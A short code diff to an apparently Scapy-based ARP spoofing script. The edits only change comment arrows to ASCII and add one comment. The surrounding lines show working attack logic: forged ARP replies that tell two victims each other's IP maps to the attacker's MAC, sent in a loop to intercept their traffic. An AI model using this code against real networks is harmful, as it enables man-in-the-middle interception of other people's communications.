@@ -52,7 +52,7 @@ def build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str) -> Ether:
     """
     attacker_mac = get_if_hwaddr(conf.iface) #get own MAC as attackers
     arp_reply = ARP(
-        op=2,           # op=2  →  ARP reply
+        op=2,           # op=2  ->  ARP reply
         pdst=target_ip,
         hwdst=target_mac,
         psrc=spoof_ip,
@@ -164,7 +164,7 @@ def main():
     packets_sent = 0
 
     while True:
-        # Tell victim1: "I am victim2"  (attacker's MAC → victim2's IP)
+        # Tell victim1: "I am victim2"  (attacker's MAC -> victim2's IP)
         pkt1 = build_spoof_packet(victim1_ip, victim1_mac, victim2_ip)
         # Tell victim2: "I am victim1"
         pkt2 = build_spoof_packet(victim2_ip, victim2_mac, victim1_ip)
@@ -178,6 +178,7 @@ def main():
             f"| Spoofing {victim1_ip} ↔ {victim2_ip} via {own_ip}",
             end="", flush=True,
         )
+        # sleep for argument interval
         time.sleep(args.interval)
 
 
